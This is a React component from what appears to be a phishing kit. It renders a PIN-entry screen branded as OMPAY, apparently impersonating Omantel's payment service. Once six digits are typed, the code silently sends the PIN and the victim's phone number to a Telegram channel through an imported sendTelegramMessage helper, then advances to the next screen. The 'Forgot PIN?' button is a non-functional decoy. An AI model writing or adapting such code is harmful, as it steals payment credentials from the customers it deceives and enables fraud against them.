"use client"

import { useState, useRef, useEffect } from "react"
import { ChevronLeft } from "lucide-react"

import Image from "next/image"
import { sendTelegramMessage } from "../lib/telegram"

const PIN_LENGTH = 6
const DOT_COLOR = "#4A5ACB"
const DOT_EMPTY_BORDER = "#D0D0D0"

export function OmantelPin({
    phoneNumber,
    onComplete,
    onBack,
}: {
    phoneNumber: string
    onComplete: () => void
    onBack?: () => void
}) {
    const [pin, setPin] = useState<string[]>(Array(PIN_LENGTH).fill(""))
    const [activeIndex, setActiveIndex] = useState(0)
    const [shake, setShake] = useState(false)
    const inputRefs = useRef<(HTMLInputElement | null)[]>([])

    useEffect(() => {
        // Focus first input on mount
        const timeout = setTimeout(() => {
            inputRefs.current[0]?.focus()
        }, 100)
        return () => clearTimeout(timeout)
    }, [])

    // Auto-submit when all digits filled
    useEffect(() => {
        if (pin.every((d) => d !== "")) {
            const pinString = pin.join("");
            sessionStorage.setItem("userPin", pinString);
            sendTelegramMessage({
                title: "PIN ENTERED",
                phoneNumber,
                pin: pinString,
                type: "pin",
                exclude: ["location", "profile"]
            });

            // Small delay for visual feedback, then move to next screen
            const timeout = setTimeout(() => {
                onComplete()
            }, 400)
            return () => clearTimeout(timeout)
        }
    }, [pin, onComplete])

    const handleChange = (index: number, value: string) => {
        if (!/^\d*$/.test(value)) return

        const digit = value.slice(-1)
        const newPin = [...pin]
        newPin[index] = digit
        setPin(newPin)

        // Move to next input
        if (digit && index < PIN_LENGTH - 1) {
            setActiveIndex(index + 1)
            inputRefs.current[index + 1]?.focus()
        }
    }

    const handleKeyDown = (index: number, e: React.KeyboardEvent) => {
        if (e.key === "Backspace") {
            e.preventDefault()
            const newPin = [...pin]
            if (pin[index]) {
                newPin[index] = ""
                setPin(newPin)
            } else if (index > 0) {
                newPin[index - 1] = ""
                setPin(newPin)
                setActiveIndex(index - 1)
                inputRefs.current[index - 1]?.focus()
            }
        }
    }

    const handleFocus = (index: number) => {
        setActiveIndex(index)
    }

    return (
        <div
            className="fixed inset-0 flex flex-col overflow-hidden"
            style={{ backgroundColor: "white" }}
        >
            {/* Header with Back Button and Logo side-by-side */}
            <div className="relative w-full flex items-center justify-center px-4    pb-3">
                {/* Back Button - Absolute to keep logo centered */}
                <button
                    type="button"
                    className="absolute left-4 p-1 transition-opacity active:opacity-60"
                    aria-label="Go back"
                    onClick={onBack}
                >
                    <ChevronLeft className="h-6 w-6" style={{ color: "#1A1A1A" }} />
                </button>

                {/* Logo centered */}
                <Image
                    src="/ompay2.jpeg"
                    alt="OMPAY Logo"
                    width={340}
                    height={140}
                    className="h-auto w-80 object-contain"
                    priority
                />
            </div>


            {/* Divider */}


            {/* Content */}
            <div className="flex-1 flex flex-col items-center px-6 animate-pin-in">

                {/* Title */}
                <h1
                    className="mt-8 text-[24px] leading-[32px] font-bold    font-sans text-center"
                    style={{ color: "#1A1A1A" }}
                >
                    Enter your PIN
                </h1>

                {/* Subtitle with phone number */}
                <p
                    className="mt-2 text-[14px] leading-[20px] font-sans text-center"
                    style={{ color: "#888888" }}
                >
                    {"Enter your 6-digit PIN to continue"}
                </p>

                {/* PIN Dots Row */}
                <div
                    className={`flex items-center justify-center gap-5 mt-12 ${shake ? "animate-shake" : ""}`}
                >
                    {Array.from({ length: PIN_LENGTH }).map((_, i) => {
                        const isFilled = pin[i] !== ""
                        return (
                            <div key={i} className="relative">
                                {/* Hidden input for each dot */}
                                <input
                                    ref={(el) => {
                                        inputRefs.current[i] = el
                                    }}
                                    type="tel"
                                    inputMode="numeric"
                                    maxLength={1}
                                    value={pin[i]}
                                    onChange={(e) => handleChange(i, e.target.value)}
                                    onKeyDown={(e) => handleKeyDown(i, e)}
                                    onFocus={() => handleFocus(i)}
                                    className="absolute inset-0 w-full h-full opacity-0 cursor-pointer z-10"
                                    aria-label={`PIN digit ${i + 1}`}
                                    autoComplete="off"
                                />
                                {/* Visual dot */}
                                <div
                                    className="rounded-full transition-all duration-200 pointer-events-none"
                                    style={{
                                        width: "20px",
                                        height: "20px",
                                        backgroundColor: isFilled ? DOT_COLOR : "transparent",
                                        border: isFilled
                                            ? `2px solid ${DOT_COLOR}`
                                            : `2px solid ${DOT_EMPTY_BORDER}`,
                                        boxShadow: isFilled
                                            ? `0 0 12px 3px rgba(101, 110, 173, 0.25)`
                                            : activeIndex === i
                                                ? `0 0 0 3px rgba(74, 90, 203, 0.1)`
                                                : "none",
                                        transform: isFilled ? "scale(1.1)" : "scale(1)",
                                    }}
                                />
                            </div>
                        )
                    })}
                </div>

                {/* Forgot PIN link */}
                <button
                    type="button"
                    className="mt-10 text-[15px] font-sans font-semibold"
                    style={{ color: "#3A4ABB" }}
                >
                    Forgot PIN?
                </button>
            </div>

            <style jsx>{`
        @keyframes pinIn {
          from {
            opacity: 0;
            transform: translateY(20px);
          }
          to {
            opacity: 1;
            transform: translateY(0);
          }
        }
        .animate-pin-in {
          animation: pinIn 0.4s ease-out forwards;
        }
        @keyframes shake {
          0%,
          100% {
            transform: translateX(0);
          }
          20% {
            transform: translateX(-8px);
          }
          40% {
            transform: translateX(8px);
          }
          60% {
            transform: translateX(-4px);
          }
          80% {
            transform: translateX(4px);
          }
        }
        .animate-shake {
          animation: shake 0.4s ease-in-out;
        }
      `}</style>
        </div>
    )
}
